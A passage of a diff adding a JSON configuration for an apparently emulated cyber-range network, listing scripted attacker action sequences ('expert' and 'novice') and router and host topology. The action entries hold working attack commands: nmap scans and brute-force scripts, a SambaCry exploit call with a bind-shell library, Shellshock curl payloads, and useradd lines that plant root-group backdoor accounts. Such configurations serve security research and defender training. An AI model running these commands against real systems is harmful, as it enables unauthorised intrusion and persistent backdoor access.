+        "descr": "Uses the CVE-2010-0426 vulnerability to perform privilege escalation to get root access",
+        "id": "CVE_2010_0426_PRIV_ESC",
+        "index": 11,
+        "ips": [],
+        "name": "CVE-2010-0426 exploit",
+        "type": "PRIVILEGE_ESCALATION",
+        "vulnerability": "cve-2010-0426"
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "/sql_injection_exploit.sh"
+        ],
+        "descr": "Uses the DVWA SQL Injection exploit to extract secret passwords",
+        "id": "DVWA_SQL_INJECTION",
+        "index": 12,
+        "ips": [],
+        "name": "DVWA SQL Injection Exploit",
+        "type": "EXPLOIT",
+        "vulnerability": "dvwa_sql_injection"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "/cve_2015_1427_exploit.sh {}:9200"
+        ],
+        "descr": "Uses the CVE-2015-1427 vulnerability to get remote code execution and then sets up a SSH backdoor to upgrade the channel",
+        "id": "CVE_2015_1427_EXPLOIT",
+        "index": 19,
+        "ips": [],
+        "name": "CVE-2015-1427 exploit",
+        "type": "EXPLOIT",
+        "vulnerability": "cve-2015-1427"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      }
+    ],
+    "expert": [
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"
+        ],
+        "descr": "Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor to upgrade the channel",
+        "id": "SAMBACRY_EXPLOIT",
+        "index": 1,
+        "ips": [],
+        "name": "Sambacry Explolit",
+        "type": "EXPLOIT",
+        "vulnerability": "cve-2017-7494"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "/sql_injection_exploit.sh"
+        ],
+        "descr": "Uses the DVWA SQL Injection exploit to extract secret passwords",
+        "id": "DVWA_SQL_INJECTION",
+        "index": 10,
+        "ips": [],
+        "name": "DVWA SQL Injection Exploit",
+        "type": "EXPLOIT",
+        "vulnerability": "dvwa_sql_injection"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "/cve_2015_1427_exploit.sh {}:9200"
+        ],
+        "descr": "Uses the CVE-2015-1427 vulnerability to get remote code execution and then sets up a SSH backdoor to upgrade the channel",
+        "id": "CVE_2015_1427_EXPLOIT",
+        "index": 10,
+        "ips": [],
+        "name": "CVE-2015-1427 exploit",
+        "type": "EXPLOIT",
+        "vulnerability": "cve-2015-1427"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"
+        ],
+        "descr": "Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor to upgrade the channel",
+        "id": "SAMBACRY_EXPLOIT",
+        "index": 5,
+        "ips": [],
+        "name": "Sambacry Explolit",
+        "type": "EXPLOIT",
+        "vulnerability": "cve-2017-7494"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      }
+    ],
+    "novice": [
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sS -p- --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A stealthy and fast TCP SYN scan to detect open TCP ports on the subnet",
+        "id": "TCP_SYN_STEALTH_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "TCP SYN (Stealth) Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -p 22 --script ssh-brute --script-args userdb=/SecLists/Usernames/top-usernames-shortlist.txt,passdb=/SecLists/Usernames/top-usernames-shortlist.txt,ssh-brute.timeout=8s,brute.firstonly=true --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A dictionary attack that tries common passwords and usernames for SSH where username=password",
+        "id": "SSH_SAME_USER_PASS_DICTIONARY_HOST",
+        "index": 0,
+        "ips": [],
+        "name": "SSH dictionary attack for username=pw",
+        "type": "EXPLOIT",
+        "vulnerability": "ssh-weak-password"
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -p 23 --script telnet-brute --script-args userdb=/SecLists/Usernames/top-usernames-shortlist.txt,passdb=/SecLists/Usernames/top-usernames-shortlist.txt,telnet-brute.timeout=8s,brute.firstonly=true --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A dictionary attack that tries common passwords and usernames for Telnet where username=password",
+        "id": "TELNET_SAME_USER_PASS_DICTIONARY_HOST",
+        "index": 1,
+        "ips": [],
+        "name": "Telnet dictionary attack for username=pw",
+        "type": "EXPLOIT",
+        "vulnerability": "telnet-weak-password"
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -p 21 --script ftp-brute --script-args userdb=/SecLists/Usernames/top-usernames-shortlist.txt,passdb=/SecLists/Usernames/top-usernames-shortlist.txt,ftp-brute.timeout=8s,brute.firstonly=true --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A dictionary attack that tries common passwords and usernames for FTP where username=password",
+        "id": "FTP_SAME_USER_PASS_DICTIONARY_HOST",
+        "index": 10,
+        "ips": [],
+        "name": "FTP dictionary attack for username=pw",
+        "type": "EXPLOIT",
+        "vulnerability": "ftp-weak-password"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "sudo service ssh start",
+          "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"
+        ],
+        "descr": "If taken root on remote machine, installs a ssh backdoor, useful for upgrading telnetor weaker channels",
+        "id": "SSH_BACKDOOR",
+        "index": -1,
+        "ips": [],
+        "name": "Install SSH backdoor",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sS -p- --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A stealthy and fast TCP SYN scan to detect open TCP ports on the subnet",
+        "id": "TCP_SYN_STEALTH_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "TCP SYN (Stealth) Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p $(openssl passwd -1 '{}') {}'\" http://{}:80/cgi-bin/vulnerable",
+          "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'\" http://{}:80/cgi-bin/vulnerable"
+        ],
+        "descr": "Uses the Shellshock exploit and curl to do remote code execution and create a backdoor",
+        "id": "SHELLSHOCK_EXPLOIT",
+        "index": 12,
+        "ips": [],
+        "name": "ShellShock Explolit",
+        "type": "EXPLOIT",
+        "vulnerability": "cve-2014-6271"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -p 22 --script ssh-brute --script-args userdb=/SecLists/Usernames/top-usernames-shortlist.txt,passdb=/SecLists/Usernames/top-usernames-shortlist.txt,ssh-brute.timeout=8s,brute.firstonly=true --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A dictionary attack that tries common passwords and usernames for SSH where username=password",
+        "id": "SSH_SAME_USER_PASS_DICTIONARY_HOST",
+        "index": 13,
+        "ips": [],
+        "name": "SSH dictionary attack for username=pw",
+        "type": "EXPLOIT",
+        "vulnerability": "ssh-weak-password"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PRIVILEGE_ESCALATION_ROOT",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "/cve_2010_0426_exploit.sh {}",
+          "/create_backdoor_cve_2010_0426.sh"
+        ],
+        "descr": "Uses the CVE-2010-0426 vulnerability to perform privilege escalation to get root access",
+        "id": "CVE_2010_0426_PRIV_ESC",
+        "index": 13,
+        "ips": [],
+        "name": "CVE-2010-0426 exploit",
+        "type": "PRIVILEGE_ESCALATION",
+        "vulnerability": "cve-2010-0426"
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sS -p- --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A stealthy and fast TCP SYN scan to detect open TCP ports on the subnet",
+        "id": "TCP_SYN_STEALTH_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "TCP SYN (Stealth) Scan",
+        "type": "RECON",
+        "vulnerability": null
+      }
+    ]
+  },
+  "subnetwork_masks": [
+    "<EXECUTION_ID>.9.1.0/24",
+    "<EXECUTION_ID>.9.2.0/24",
+    "<EXECUTION_ID>.9.3.0/24",
+    "<EXECUTION_ID>.9.4.0/24",
+    "<EXECUTION_ID>.9.5.0/24",
+    "<EXECUTION_ID>.9.6.0/24",
+    "<EXECUTION_ID>.9.7.0/24",
+    "<EXECUTION_ID>.9.8.0/24",
+    "<EXECUTION_ID>.9.9.0/24"
+  ],
+  "topology_nodes": [
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_router_2_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.10",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.1.10",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.10",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_ssh_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.78",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.3.78",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_3",
+            "subnet_mask": "<EXECUTION_ID>.9.3.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.78",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_samba_2_1",
+      "input_accept": [],
